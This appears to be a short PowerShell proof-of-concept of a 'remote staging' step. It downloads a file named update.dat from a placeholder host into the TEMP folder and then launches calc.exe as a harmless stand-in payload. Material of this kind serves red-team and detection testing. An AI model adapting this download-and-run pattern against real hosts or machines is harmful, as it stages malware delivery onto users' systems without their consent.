
# Remote staging
$FetchUrl = 'http://contoso.com/update.dat'
$LocalPath = "$env:TEMP\update.dat"
Invoke-WebRequest -Uri $FetchUrl -OutFile $LocalPath -UseBasicParsing
Start-Process -FilePath 'calc.exe'
$ProgressPreference = "SilentlyContinue"
